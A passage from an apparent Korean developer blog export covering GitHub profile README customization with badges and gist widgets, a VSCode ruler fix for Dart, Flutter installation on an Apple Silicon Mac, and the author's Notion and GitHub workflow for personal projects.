없다고 생각하는 1인이다.  \n그래서 난 차라리 급여는 좀 낮아도 워라벨이 좋은 곳을 찾아서,  \n개발 외 다른 지식을 공부하는게 더 나은것 같다고 생각한다.\n\n정말 잘 생각해볼 문제다.  \n급여 연 1억 받아봤자 개발자로 그거 유지하려면 퇴근이 없거나,  \n근속년수가 5년을 못넘길거다.\n\n이제 개발자도 개발만 공부하면 소위 40대 이후에 많이 힘든 삶을 살것 같다.  \n전문직이나 특수 직군처럼 급여 하방이 높은것도 아니고,  \n옛말처럼 굵지 않지만 얇고 아주 조금 길게 가는 직업군인 것 같다.\n\n뭔가 메리트가 엄청 높은 직업군은 아닌듯 싶다.\n\n내가 삼전 퇴사하고 스타텁 구르고 하다가 개발을 내려놓고,  \n다른 것을 해보면서 배운 귀중한 경험이다.  \n부디 나중에 본인 미래를 생각해서 **개발에만 올인하는 무서운 과오**를 저지르지 않길 바라는 마음이다.\n\n요 몇일전 개발자하면 좀 잘 살수 있을까요? 라는 이상한 이야기를 들어서 그런듯...  \n(결론은 개발자로는 잘 살수 없다....물론 상대적이지만....)  \n사설이 길었다.\n\n## 뭐부터 해야 할까?\n\n일단 다들 Github는 있을거고...  \n먼저 리포지토리를 하나 파야 한다.\n\n근데 리포지토리명을 다른 이름 말고 본인 이름과 같이 쓴다.  \n아래 사진을 참고하자.\n\n![](/img02.png)\n\n하단의 파란 박스에 나온 것처럼 특수 리포지토리라 하는데 **ReadMe.md** 파일로 꾸미는거다.  \n나는 이미 만들어서 존재한다 뜨는데 없는 분은 생성할 수 있을 것이다.\n\n만들고 나면 바로 웹상에서 **ReadMe.md**파일을 수정하고 반영할 수 있다.  \n나는 아래와 같이 만들었다.\n\n![](/img03.png)\n\n뭐 복잡하게 만들면 오히려 마이너스인거 같아서 간단하게 만들었다.  \n최대한 간단하게 쓰려 했는데...  \n나를 소개하는 부분을 좀 줄여야 할듯 싶다.\n\n일단 만들기전에 다른 사람들거도 좀 보고 어떤 식으로 배치할지,  \n어떤 컨텐츠를 넣을지 잘 생각해보고 만들어보자.\n\n나는 우선 상단에 타이틀을 넣고, 개발 블로그와 이메일을 넣었다.  \n여기엔 포트폴리오 링크도 넣을 예정이다.\n\n그리고 이 리포지토리의 주인이 뭐하는 사람인지 간략하게 적는게 좋을 것 같다.  \n이렇게 적고 스킬에는 너무 과하게 적지 않았다.\n\n내가 경험한 것들 위주로... 그리고 너무 기본적인 것은 뺐다.  \nHTML5, CSS, SQL 이런거는 글쎄...  \n내가 약 5년차인데 이 년차에서 저런건 마이너스인듯 하다.  \n최대한 간단하고 심플하게... 어떤 기술을 주로 쓰는지만 넣으면 좋을 것 같다.\n\n그리고 핀 리포지토리는 저렇게도 쓸 수 있는데 아래부터 적용법을 알아보자.\n\n## 타이틀\n\n저건 만들어주는 깃허브가 있다.  \n[capsule-render](https://github.com/kyechan99/capsule-render#demo) 리포지토리를 참고하자.\n\n저 리포지토리의 ReadMe를 참고하면 적용하기 쉬울 것이다.  \n근데 저기서 **waving**타입은 깨지는것 같아서 안썼다.\n\n![](/img04.png)\n\n이런 느낌?  \n이거 말고도 몇 가지 깨지는 것이 있어서 그냥 심플하게 사용하는게 좋을 듯 싶다.\n\n## 라벨 (상단 링크 형태)\n\n상단에도 쓰이고 기술 내역에서도 쓰이는 라벨이다.\n\n![](/img05.png)\n\n이건 [shields.io](https://shields.io)를 사용하였다.  \n들어가면 뭔가 클래시컬하고 뭐지? 싶은데 간단하다.\n\n```\nhttps://img.shields.io/badge/<LABEL>-<MESSAGE>-<COLOR>\n```\n\n기본은 이런 형태로 시작한다.  \n마크다운이라 해도 기본적인 HTML 코드는 일부 사용이 가능하다.  \n그래서 img 태그로 감싸서 쓸 수 있다.\n\n하지만 저것처럼 클릭하면 페이지 이동을 하려면,  \n그냥 마크다운 쓰는게 편해서 난 아래와 같이 적용했다.\n\n```\n[![Blog badge](https://img.shields.io/badge/Dev_Blog-blueviolet?style=flat&logo=github&logoColor=white)](https://elfinlas.github.io/)\n[![Blog badge](https://img.shields.io/badge/elfinlas@gmail.com-informational?style=flat&logo=gmail&logoColor=white)](mailto:elfinlas@gmail.com)\n```\n\n이렇게 하면 클릭해서 페이지 이동을 하는 **a**태그랑 비슷한 효과를 낼 수 있다.  \n단 새탭이나 새창은 안된다.\n\n## 라벨 (기술쪽)\n\n여긴 페이지 이동이 필요 없고 라인 하나씩 하는게 필요해서 html 태그를 써서 처리했다.\n\n```html\n<div>\n  <img\n    src=\"https://img.shields.io/badge/Java-FFFFFF?style=for-the-square&logo=openjdk&logoColor=black\"\n  />\n  <img\n    src=\"https://img.shields.io/badge/Javascript-F7DF1E?style=for-the-square&logo=javascript&logoColor=white\"\n  />\n  <img\n    src=\"https://img.shields.io/badge/Typescript-blue?style=for-the-square&logo=typescript&logoColor=white\"\n  />\n</div>\n```\n\n여기서 좀 더 다뤄보면...  \n이 이미지 형태는 url 전달인자로 **라벨-메세지-컬러** 순으로 입력받는다.  \n그 외의 설정은 쿼리 형태로 받는다.\n\n![](/img06.png)\n\n이 사진을 좀 참고하면...  \n한글로 된 부분이 라벨영역, 영문이 메세지, 그리고 색상이 적용된 모습이다.  \n라벨 영역의 색깔은 못바꾸고, 메세지 영역만 바꿀 수 있다.\n\n그리고 라벨은 생략이 가능하다.\n\n![](/img07.png)\n\n생략을 해서 쓰는게 좋을 듯 싶다.\n\n색상의 경우 영문으로 써도 되지만 16진수 값을 넣어도 된다.  \n넣을 때는 **#은** 빼고 넣는다.\n\n```\n#FFFFFF => FFFFFF\n```\n\n그리고 뒤에 파라메터는 [shields.io](https://shields.io) 내역을 참고하자.  \n근데 주로 쓰는건 몇 안되는 듯 싶다.  \n아래는 몇개 주로 다루는 쿼리를 설명한다.\n\n### style\n\n이건 라벨의 크키를 정한다.\n\n![](/img08.png)\n\n위 공식 페이지의 내용을 참고하면 바로 이해가 될거디.  \n근데 **for-the-badge**이거는 글자가 무조건 대문자로 고정이 된다.  \n참고하자.\n\n### logo\n\n저 로고는 다른건 안되고 [simpleicons](https://simpleicons.org) 만 사용이 가능하다.\n\n![](/img09.png)\n\n어지간한건 다 있다.  \n저기 검색창에 키워드 치면 해당 연관 아이콘을 띄워준다.\n\n```\nhttps://img.shields.io/badge/Java-FFFFFF?style=for-the-square&logo=openjdk&logoColor=black\n```\n\n저기 쿼리의 **logo**에 심플 아이콘에서 제공하는 이름을 넣으면 된다.  \n근데 여기서 주의할 것은 이름이 영문 옆을 선택해야 한다.\n\n![](/img10.png)\n\n이거는 복사가 안된다.  \n아래처럼 영문 이름 옆을 선택해야 한다.\n\n![](/img11.png)\n\n그리고 색상은 logoColor보단 라벨 style에 입히는게 잘 나온다.\n\n여담으로 자바는 안나온다.  \n이유는 알다시피 오라클 변호사에서 뭐라 해서 그런 것 같다.\n\n심플아이콘 깃허브 [issue-8194](https://github.com/simple-icons/simple-icons/issues/8194)에 따르면 자바가 안보인다 했는데 [issue-7378](https://github.com/simple-icons/simple-icons/pull/7378)를 참고하라 한다.\n\n![](/img12.png)\n\n그래서 사용할 사람은 **OpenJDK**로 검색해서 쓰면 된다.\n\n## Pinned\n\n여기는 리포지토리 고정인데 아래처럼 사용할 수도 있다.\n\n![](/img13.png)\n\n뭐 본인이 개쩌는 오픈소스 만들거나, 유명한 오픈소스 컨트리뷰터라면 그거 넣는게 좋겠지만...  \n나는 개쩌는거 없다 -\\_-;;  \n그래서 그냥 위처럼 대충 열심히는 하는구나 느낌을 주려 넣었다.\n\n근데 나는....  \n오픈된 리포지토리는 예제용이고, 보통 내가 작업하는건 프라이빗을 많이 쓴다.  \n그래서 제대로 적용되는지는 모르겠지만...  \n없는것 보다는 나을듯 싶다.\n\n일단 두 개인데 하나는 언제 커밋 많이 하냐랑 하나는 깃헙 상태 요약이다.  \n아래부터 하나씩 만들어가는 것을 공유해본다.\n\n### productive-box\n\n[productive-box](https://github.com/maxam2017/productive-box) 이거는 아래와 같이 커밋을 언제 하는지 정보를 제공한다.\n\n![](/img14.png)\n\n이걸 띄울려면 **gist**가 필요하다.\n만드려면 리포지 만드는거 아래에 있다.\n\n#### gist 생성\n\n![](/img15.png)\n\n클릭하면 gist를 만들 수 있다.\n\n![](/img16.png)\n\n여기선 저기 **Gist Description**에 대충 이름 짓는다.  \n그리고 내용도 아무 글자 하나 입력해준다.  \n어짜피 다시 봇이 만들어주고, 재작성되서 정성스래 쓸 필요가 없다.\n\n중요한 것은 **공개(public)**으로 만들어야 한다.  \n위 사진처럼 **Create public gist**로 만들어준다.\n\n![](/img17.png)\n\n만들고나면 저 주소의 아이디 뒤의 값을 잘 복사해둔다.  \n그리고 토큰을 하나 생성해줘야 한다.\n\n#### token 생성\n\n[github token](https://github.com/settings/tokens/new)을 하나 만들어야 한다.  \n권한이 필요해서 토큰으로 권한을 주는거다.\n\n![](/img18.png)\n\n이름은 맘에 드는걸로 주고, 만료기간은 원하는 만큼?  \n난 근데 재생성해주고 하는게 귀찮아질 것 같아서 무제한으로 했다.  \n참고로 **Fine-Grained Token**을 쓸 수 있지만 이건 무한이 없다.  \n어짜피 키도 노출될 일도 없고 해서 그냥 토큰으로 무제한 했다.\n\n권한은 **repo**이거랑 **gist** 두개를 줬다.  \n이렇게 하고 토큰이 생성하면 이것도 잘 복사해두자.  \n여기 포스팅 기준 두 번쓰고, 암호는 이 페이지를 벗어나면 알 수 없게 된다.\n\n### 리포지토리 Fork 및 설정\n\n[productive-box](https://github.com/maxam2017/productive-box) 여기가서 **Fork**를 뜬다.  \n그리고 포크된 레포지토리에서 **Action**탭을 선택해서 활성화해준다.  \n처음하면 옆에 flow인가 뭐도 활성화 해줘야 한다.\n\n![](/img19.png)\n\n<br>\n\n그리고 **Settings** 탭에 가서 **Security**내의 **Secrets and variables**항목의 **Actions**를 선택한다.\n\n![](/img20.png)\n\n<br>\n\n상단의 **New repository secret**을 선택해준다.\n\n![](/img21.png)\n\n<br>\n\n이름은 꼭 맞춰서 **GH_TOKEN**이라는 값을 주고, 비밀값에는 아까 만든 토큰을 넣고 추가해준다.  \n그리고 이제 **code**탭으로 가서 **.github/workflows**항목의 **schedule.yml**파일을 수정한다.  \n웹에서도 수정이 가능하다.\n\n```yml\nname: Update gist\non:\n  repository_dispatch:\n    types: [build-event]\n  schedule:\n    - cron: \"0 0 * * *\"\njobs:\n  update-gist:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Update gist\n        uses: elfinlas/productive-box@master\n        env:\n          GH_TOKEN: ${{ secrets.GH_TOKEN }}\n          GIST_ID: 68fb5ca617d4e335dcbe53f87e8abe05\n          TIMEZONE: Asia/Seoul\n```\n\n다른거 건들지말고, **GIST_ID**는 아까 만든 Gist 값을 입력하고, 타임라인은 서울로 맞추고 끝이다.  \n마지막으로 Github 메인으로 가서 **Customize Your pins**를 누르면 선택할 수 있는데 아까 만든 gist를 선택하면 된다.\n\n근데 동작이 안되고, 포크 뜬 리포의 액션 탭에서 아래와 같은 에러가 날 수 있다.\n\n![](/img22.png)\n\n<br>\n\n이 경우 권한이 부여가 안된 것이다.\n아래 에러코드를 보면 403이다.\n\n![](/img23.png)\n\n<br>\n\n이 경우 리포지토리의 **Settings**탭의 **Code and automation**의 **Actions** 항목의 **General**을 들어간다.\n\n![](/img24.png)\n\n<br>\n\n좀 아래로 내려가면 아래와 같은 항목이 있다.\n\n![](/img25.png)\n\n여기서 권한이 기존에는 **Read repository...**로 되어있을텐데, 위의 **Read and write**로 변경하고 저장한다.  \n그리고 **schedule.yml**을 수정하던 하면 다시 액션이 정상적으로 수행될 것이다.\n\n<br>\n\n### github-stats-box\n\n[github-stats-box](https://github.com/bokub/github-stats-box) 는 자신의 깃헙 스테이터스를 표현한다.\n\n![](/img26.png)\n\n얘는 위에 **productive-box**박스랑 똑같다.  \n단지 설정파일이 **run.yml**이다.  \n그리고 얘도 설정 다른거 건들거 없고 **Gist**값만 넣으면 된다.\n\n이건 두 가지 옵션이 더 있다.\n\n#### ALL_COMMITS\n\n이건 true 값일 경우 자신의 전체 커밋을 카운트하고, false일 경우 작년 커밋만 카운트한다.\n\n#### K_FORMAT\n\ntrue면 1.5k와 같이 숫자를 \"k\"값 붙여서 노출한다.\n\n이거 외에는 아까랑 같아서...\n\n![](/no_des.png)\n\n## 정리\n\n이거 하다보니 꾸미는 재미가 있다.  \n약간 미니룸 꾸미는 느낌?\n\n몇 가지 유용한 링크도 있는데 아래를 참고하자.\n\n[이모지 검색](https://www.emojiengine.com/)  \n[이모지 gist](https://gist.github.com/rxaviers/7360908)\n\n[가장 많이 사용하는 언어 github](https://github.com/anuraghazra/github-readme-stats)  \n[백준 티어 넣기](https://github.com/mazassumnida/mazassumnida)  \n[방문자수](https://hits.seeyoufarm.com/)  \n[깃허브 스타](https://github.com/anuraghazra/github-readme-stats)  \n[gist pin 추천](https://github.com/matchai/awesome-pinned-gists)\n\n```toc\n\n```\n"},{"excerpt":"개발하려고 창을 보니... 이상한 선이 하나 떠 있었다.  예전에 인텔리J에서도 이런게 떠서 곤란했던 기억이 있는데... 처리하는건 간단하다. 하단의 톱니바퀴를 클릭하고 명령 팔레트를 선택한다.  그리고 **사용자 설정 열기(JSON)**을 선택한다. 안뜨면 Open User Settings 라고 치면 나온다.  Json 파일이 열리면 아래의 설정파일을 …","fields":{"slug":"/dart_flutter/230610_dart-vscode/"},"frontmatter":{"date":"June 10, 2023","title":"Dart 개발 시 VSCode 에디터 창에 선이 생길 때","description":null,"tags":["Dart","VSCode"],"series":"Dart","previewImage":"dart_logo.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_flutter.png)\n\n# 개발하려고 창을 보니...\n\n이상한 선이 하나 떠 있었다.\n\n![](/img01.png)\n\n예전에 인텔리J에서도 이런게 떠서 곤란했던 기억이 있는데...  \n처리하는건 간단하다.\n\n하단의 톱니바퀴를 클릭하고 **명령 팔레트**를 선택한다.\n\n![](/img02.png)\n\n<br>\n\n그리고 **사용자 설정 열기(JSON)**을 선택한다.  \n안뜨면 Open User Settings 라고 치면 나온다.\n\n![](/img03.png)\n\nJson 파일이 열리면 아래의 설정파일을 찾아서 제거한다.\n\n```\n\"editor.rulers\": [80],\n```\n\n이렇게하면 선이 사라진다.\n"},{"excerpt":"모바일 영역을 개발하려고... 최근 흑우집합소의 모바일 버전을 개발해야겠다고 마음 먹었다. 아직 메인 기능도 개발이 덜 되었지만... 유저를 늘리고, 사용자들이 보통 모바일을 많이 사용해서 모바일 앱이 필요해졌다. 원래 안드는 코틀린, iOS는 스위프트로 개발하려 했는데, 1인 개발이라 둘다 하기엔 너무 사이즈가 컸다. 그냥 앱만 개발하면 네이티브로 내려…","fields":{"slug":"/dart_flutter/230609_install-flutter/"},"frontmatter":{"date":"June 09, 2023","title":"플러터(Flutter) 설치하기 (With Mac Apple Silicon)","description":"Mac Apple Silicon에서 설치하기","tags":["Flutter","Mac"],"series":"Flutter","previewImage":"flutter_logo.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_flutter.png)\n\n# 모바일 영역을 개발하려고...\n\n최근 흑우집합소의 모바일 버전을 개발해야겠다고 마음 먹었다.  \n아직 메인 기능도 개발이 덜 되었지만...  \n유저를 늘리고, 사용자들이 보통 모바일을 많이 사용해서 모바일 앱이 필요해졌다.\n\n원래 안드는 코틀린, iOS는 스위프트로 개발하려 했는데,  \n1인 개발이라 둘다 하기엔 너무 사이즈가 컸다.\n\n그냥 앱만 개발하면 네이티브로 내려가서 개발해도 되지만...  \n현재 웹이 메인이라서 모바일까지 네이티브로 내려가면 1인으로써 감당이 안되었다.\n\n그래서 크로스 플랫폼으로 개발하기로 했다.\n\n## react native vs flutter\n\n리엑트 네이티브와 플러터 두 가지를 고려했는데...(사실 선택할게 저거 밖에...)  \n원래 리엑트를 쓰니까 리엑트 네이티브 쓸까 했는데, 플러터도 뭔가 좋아보였다.\n\n그리고 새로운 것을 한번 써보고 싶었다.  \n뭐 속도나 기능 지원 등등은 내 생각엔 비슷한 것 같았다.\n\n그래서 나는 새로운 것을 배워볼겸 플러터를 선택했다.  \n근데 이거 개발 끝나고 다른 모바일 개발에는 리엑트 네이티브도 한번 해보고 싶다.\n\n## 설치 여정\n\n먼저 [Flutter 공식 페이지](https://docs.flutter.dev/get-started/install)의 설치 항목에서 자신에게 맞는 OS를 설치해준다.  \n나는 Mac이라서 Mac으로...\n\n![](/img01.png)\n\n압축을 풀고 Fluuter 디렉토리가 뜬다.\n\n![](/img02.png)\n\n이것을 자신이 원하는 곳에 배치한다.  \n나는 그냥 **home**디렉토리에 배치했다.\n\n그리고 환경 변수를 잡아줘야 한다.\n\n```\nexport PATH=\"$PATH:`pwd`/flutter/bin\"\n```\n\n<br>\n\n나는 flutter 디렉토리가 있는 곳에서 위 명령어를 수행했다.\n\n![](/img03.png)\n\n<br>\n\n그리고 나서 커맨드에 **flutter**를 입력해보면 아래와 같이 뜬다.\n\n![](/img04.png)\n\n일단 이렇게 뜨면 Flutter를 구동할 준비는 되었다.  \n다음은 시뮬레이터 부분이다.\n\n아래의 명령어를 수행해보자.\n\n```\n> flutter doctor\n```\n\n![](/img06.png)\n\n난 맥이라서 그런가 iOS쪽인 Xcode가 있었고, 이 부분에 문제가 있었다.  \n물론 안드로이드도...\n\n## Android\n\n안드로이드 쪽은 해결하기 쉽다.\n\n<br>\n\n### Android cmdline-tools component is missing\n\n이거는 안드로이드 스튜디오를 열고 설정을 열어준다.\n\n![](/img07.png)\n\n<br>\n\n그리고 저기에 보이는 항목처럼 이동한다.  \nAppearence & Behavior => System Settings => Android SDK\n\n그리고 **SDK Tools**항목을 선택하고 저 항목 중 **Android SDK Command-line Tools**항목을 선택하고 설치해준다.\n\n![](/img08.png)\n\n<br>\n\n### Android license status unknown.\n\n이거는 명령어를 통해서 아주 쉽게 처리할 수 있다.\n\n```\n> flutter doctor --android-licenses\n```\n\n이렇게 하면 안드로이드 쪽 문제는 끝난다.\n\n## iOS\n\n![](/img09.png)\n\n나는 이미 Xcode를 설치해둔 상태라서 다른 이슈는 없었는데 저 **CocoaPods** 이슈가 있었다.  \n저게 내가 알기론 iOS의 npm? 그런 역할을 하는걸로 아는데 저게 없어서 그랬다.\n\n근데 여기서...난 m1을 사용한다.  \n그래서 저 CocoaPods 설치를 인텔 맥처럼은 설치가 불가능했다.\n\n```\n> brew install cocoapods\n```\n\n위 명령어를 수행하면 아래와 같이 아키텍쳐를 비꿔서 하라고 알려준다.\n\n![](/img10.png)\n\n<br>\n\n```\n> arch -arm64 brew install cocoapods\n```\n\n이 명령어를 하니 잘 설치가 되었다.\n\n![](/img11.png)\n\n이로써 이슈는 없고 이제 플러터를 개발할 준비는 완료되었다.\n\n## 정리\n\n뭐 기본적인거라 포스팅하기도 애매했는데 저 코코아팟 때문에 살짝 돌았다.  \n그래서 나중에 놋북 새로 사서 셋팅할 때 햇갈릴까봐 나를 위해 포스팅을 남겨둔다.\n\n```toc\n\n```\n"},{"excerpt":"개인 프로젝트 관리에 관하여... 예전에 개인 프로젝트를 할 때는 그냥 깃허브 하나 뚫고 대충 올리면서 했었다. 근데 그렇게 하면 추후 프로젝트 관리 시 문제가 생겼다. 그리고 프로젝트의 목적이나 버전 스토리 등도 뭉게지고 이력도 확인하기 어렵다. 그래서 이런 것을 막기 위해서는 프로젝트 문서화 및 체계를 잡고 하는게 중요하다고 생각한다. 좋은 코드를 작…","fields":{"slug":"/til/230523_til/"},"frontmatter":{"date":"May 24, 2023","title":"23년 5월 23일 개인 프로젝트 관리 (Notion, Github)","description":null,"tags":["TIL"],"series":"TIL","previewImage":"writing.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_til.png)\n\n# 개인 프로젝트 관리에 관하여...\n\n예전에 개인 프로젝트를 할 때는 그냥 깃허브 하나 뚫고 대충 올리면서 했었다.  \n근데 그렇게 하면 추후 프로젝트 관리 시 문제가 생겼다.\n\n그리고 프로젝트의 목적이나 버전 스토리 등도 뭉게지고 이력도 확인하기 어렵다.\n\n그래서 이런 것을 막기 위해서는 **프로젝트 문서화 및 체계**를 잡고 하는게 중요하다고 생각한다.  \n좋은 코드를 작성하고, 빠르게 결과물을 내는 것도 중요하지만 이런 체계를 어느정도 잡고 가는 것도 중요하다 생각하는 1인이다.\n\n그래서 내가 개인적으로 개발했던 MyMeLink나 [흑우집합소](https://bcow.world)는 어느정도 관리를 하면서 진행했다.  \n이번 TIL에는 내가 개인 프로젝트를 어떻게 관리하고 개발하는지를 포스팅으로 남겨보려 한다.\n\n**PS : 이건 정답은 아니며, 각자 처한 환경, 프로젝트에 따라 알맞게 하면 된다.**\n\n## 노션 (Notion)\n\n이거 안쓰는 사람도 있지만...  \n난 초창기부터 아주 잘 쓰고 있다.\n\n무튼 이 노션으로 어떻게 쓰냐?\n\n![](/img001.png)\n\n메인 페이지는 위와 같다.\n\n**로드맵**, **버전 구현 노트**, **기능 보고서**, **개발일지** 등이 있다.  \n이렇게 프로젝트를 진행하기 전, 진행하면서, 진행 이후 시점에 대한 각 문서들이 있다.\n\n뭐 이게 정답은 아니지만 개인 프로젝트도 이런 체계와 시스템을 갖추고 진행하면 추후 관리면에서 용이하다.  \n이런건 내가 삼성전자에 있을 때 따로 배운건 아닌데 하다보니 그쪽 시스템과 나만의 시스템을 결합해서 체계를 만들었다.\n\n각 항목에 대해 간단히 소개해본다.\n\n<br>\n\n### 로드맵\n\n일종의 전체 개발일정?  \n이 프로젝트의 최종 목표, 각종 버전 진행 내역, 버전 보고서 이슈 및 리포트 등을 관리한다.\n\n![](/img02.png)\n\n내 흑우집합소의 경우 최종 목표는 저렇다.  \n정말 많다 -\\_-;;\n\n뭐 하나씩 완성해가면 할 수는 있는 것들이다.  \n최종 목표가 있어야 프로젝트가 산으로 가지 않고 정해진 목적지를 향해 잘 갈수 있다.  \n그리고 저 항목들 안에는 엄청 디테일 하지는 않지만 어느정도 세부 사항을 정해서 둔다.\n\n그리고 저기 버전별 보고서는 다음에 소개할 **버전 구현 노트**쪽으로 들어갔다.  \n아무래도 로드맵은 오버뷰 성향으로 된 것이라서 복잡하면 안되고 간단하면서도, 목적을 제공하는 페이지에서 끝을 냈다.\n\n<br>\n\n### 버전 구현 노트\n\n여기는 프로젝트 버전별 노트다.\n\n![](/img03.png)\n\n<br>\n\n여기는 개발 버전에 따른 정리 문서다.  \n[흑우집합소](https:bcow.world)의 경우 아래와 같은 버전 규칙이 있다.\n\n**X.Y.Z**\n\n- X : 대규모 업데이트 및 전환점에 사용하는 버전 코드\n  - 서비스 내 많은 변경이 있거나 UI 및 UX가 완전히 변할 때\n- Y : 중간 규모의 업데이트에 사용하는 버전 코드\n  - 신규 기능인데 새로운 형태의 기능이 추가되거나 할 때\n- Z : 작은 규모의 업데이트에 사용하는 버전 코드\n  - 자잘한 버그 및 핫픽스 처리\n  - 신규 또는 기존 기능의 하위 기능이 추가되거나 변경될 때\n\n<br>\n\n뭐 예전에 어디서 본게 있어서 대충 나한테 맞게 정했다.  \n보통 **Z** 버전의 경우 1~2주 정도 소요를 맞춰서 진행했다.\n\n**X, Y**의 경우 크게 잡는다기 보다는 **Z** 버전 일정 안에 녹여서 진행했다.\n\n**주요 목표**는 해당 버전에 대한 가시적 주요 목표다.  \n뭔가 버그가 있거나, 목표한 기능이 들어간다.\n\n**Issue 현황**의 경우 깃허브에 등록된 이슈와 함께 물고 들어간다.  \n이 부분은 아래 Github에서 다시 소개하겠다.  \n그냥 현재 내가 어떤 이슈를 할당받고, 진행하며, 처리했는지를 나타낸다.\n\n근데 개인 프로젝트라 셀프 이슈할당, 진행, 완료를 한다 -\\_-;;\n\n<br>\n\n![](/img04.png)\n\n<br>\n\n**업무 진행 내역**은 하루에 뭐 했는지를 쓰는 부분이다.  \n이거는 일종의 자기관리용?  \n이거 안하면 내가 언제 이걸 했는지 망각하거나 루즈하게 갈 수 있다.\n\n**보고서**는 버전 배포 이후 사후 관리용이다.  \n일종의 회고같은?\n\n이번 버전을 진행하며 주요 목표 달성내역, 그리고 추가적으로 진행한 오버런 내역을 작성한다.\n\n![](/img05.png)\n\n<br>\n\n처리한 이슈는 위에 테이블에서 하는거랑 같은 기능이라 지금은 안쓴다.  \n그리고 **학습하며 배운점 및 기타**는 개발하며 배우거나 알게 된 내용을 정리하는 공간이다.\n\n일단 링크나 간단한 코드 등을 모아두고, 시간이 될 때(?) 이렇게 블로그로 정리해둔다.  \n사실 아직도 정리 못한 내용이 많....다.\n\n<br>\n\n### 기능 보고서\n\n굵직하거나 주요 기능에 대한 보고서다.  \n이걸 왜 만들었냐 하면 기능에 대한 정의 및 구현 내역의 히스토리가 필요할 것 같아서 넣었다.\n\n![](/img06.png)\n\n<br>\n\n대략 이런 식이다.  \n근데 이 기능 보고서는 여기에 두고 다른 페이지에 만들었다.  \n거기가 초창기 버전 문서다.\n\n![](/img07.png)\n\n저기 안에 기능 보고서를 대충 뼈대만 만들어둔 게 있는게 그걸 하나씩 옮겨야 한다.  \n근데 이것도 일이라서... 조만간 노션 정리를 할 때 다 옮겨야 겠다.\n\n<br>\n\n### 개발 일지\n\n이거는 원래 TIL 용으로 썼는데 이거는 **버전 노트**에서 들어간 내용이라 현재는 **deprecated**된 상태...\n\n사실 개발하며 배우는 부분이 갈 수록 늘어나는 것 같아서 일일히 정리하려 했지만...  \n이걸 하면서 개발을 하면 속도가 너무 느려져서 일단 대단원 잡고 해당 내용에 대한 간단 코멘트와 링크를 남기는 형태로 가게 되었다.\n\n![](/img08.png)\n\n<br>\n\n대략 이런 느낌?  \n그래서 추후 기능 개발을 할 때 참고하거나, 구현 후 개발 블로그에 정리할 때 참고하는 식으로 사용한다.\n\n다음은 Github 활용에 대해 소개해본다.\n\n<br>\n\n## Github\n\n뭐 따로 깃허브에 대해 설명은 하지 않겠다.  \n아무래도 개인 프로젝트이고, 추후 상용화 또는 개인 자산이기에 **Private Repo**로 지정하고 작업을 한다.\n\n전에는 [Yona](https://github.com/yona-projects/yona)를 사용했는데 깃헙이 개인 레포를 무료로 풀어서 이리로 옮겼다.  \n지금도 집에 Yona를 돌리던 nas에는 내 iOS 프로젝트들이 있어서 가끔 추억 회상용(?)으로 본다. -\\_-;;\n\n무튼 다시 돌아와서...  \n깃헙에서 내가 주로 쓰는건 몇 개 안된다.  \n그중 중요한 것은 **브런치 전략**이랑 **이슈관리 및 풀 리퀘스트(PR)**, 그리고 **마일스톤**정도가 있다.\n\n<br>\n\n### 브런치 전략\n\n매우 중요한 전략이다.  \n브런치를 어떻게 관리하느냐에 따라 코드에 문제가 생겼을 때 이력 추적을 하기 쉽거나 어려워진다.\n\n이 브런치 전략은 사람마다, 그리고 프로젝트 성향마다 달라진다.  \n내 경우 아래와 같은 원칙을 세우고 브런치 전략을 수립했다.\n\n- 메인 브런치\n  - 통합용으로 현재 개발하여 최종적인 결과물이 유지되는 브런치다.\n  - 개발용 및 테스트 용으로 쓰이며, 각 이슈 브런치들의 기준점이 되는 브런치\n\n<p></p>\n\n- 운영 브런치\n  - 실제 운영을 하는 버전 브런치\n  - 메인 브런치는 최신 브런치지만 기능이 빠지거나 만들어지는 단계라면, 운영 브런치는 스테이블 된 브런치다.\n  - 이 브런치는 가급적 건들지 않고, 배포 시에만 **pull**을 땡겨오는 용도로 사용한다.\n  - 보통은 직접 이곳으로 **Pull Request**를 하지 않는다. (단 핫픽스 제외)\n\n<p></p>\n\n- 이슈 브런치\n  - 깃허브의 이슈를 등록하면, 그 이슈를 기반으로 만드는 브런치\n  - 보통 이름은 그냥 issueXX 로 정한다.\n  - 이슈는 아래에서 자세히 언급하겠지만, 너무 방대한 기능이 아닌 하나의 작은 기능이 하나의 이슈가 된다.\n\n<p></p>\n\n- 핫픽스 브런치\n  - 배포 이후 급하게 처리를 해야 하는 이슈가 생길 때 사용한다.\n  - 이 브런치도 이슈 브런치와 유사하지만, Pull Request를 두 곳에 진행한다. (메인, 운영)\n\n<p></p>\n\n- 배포 통합용 브런치\n  - 이슈 브런치를 통합하여 메인 브런치가 운영용으로 배포할 때 사용하는 브런치\n  - release_1.0.2 형태로 만들어진다.\n  - 만약 나눠서 배포해야 한다면 1.0.2.1 이런식으로 하나의 필드가 추가된다.\n  - 메인 브런치를 기준으로 하며, Pull Request를 운영 브런치에 하는 용도로 사용된다.\n\n<br>\n\n뭔가 복잡해 보이는데 사실 해보면 별거 없다.  \n그냥 용도에 맞게끔 맞춰서 하는게 끝이다.\n\n더 나은 전략도 있겠지만, 소규모 프로젝트에서는 이게 제일 좋은 방법인 것 같다.(주관적 의견)  \n뭐 정말 작은 프로젝트고 하면 그냥 원 브런치 전략으로 가도 된다.\n\n하지만 나의 경우 백엔드 레포와 프론트 레포를 나눠 쓰며, 각 기능들이나 이슈들도 상당히 세분화 해서 사용한다.  \n그래서 이게 나에게 있어서 최선의 브런치 전략인 것 같다.\n\n<br>\n\n### 이슈관리 및 풀 리퀘스트\n\n이슈는 깃허브에서 이슈 또는 다양한 용도로 사용할 수 있는 기능이다.  \n여기선 이것에 대해 자세히 다루는 것 보단 내가 어떤 식으로 사용하는지 설명한다.\n\n![](/img09.png)\n\n<br>\n\n이건 프론트 쪽 이슈다.  \n보면 Feature, CR등 다양한 접두사들이 붙어있고, 라벨도 있다.\n\n한참 예전에 등록한 이슈들도 있고...-\\_-;;  \n위에서 살짝 언급했지만 기능 덩어리를 하나의 이슈로 등록한다.\n\n너무 큰 기능의 경우 또 세부적으로 나눠서 이슈 등록 후 구현한다.  \n난 **Labels**를 나의 프로젝트에 맞게끔 바꿨다.\n\n![](/img10.png)\n\n<br>\n\n원래 더 나눌까 하다가 관리도 어렵고 개인 프로젝트인데 더 빡세게 할 필요도 없어서 대충 저 정도로 나눴다.\n\n- Bug\n  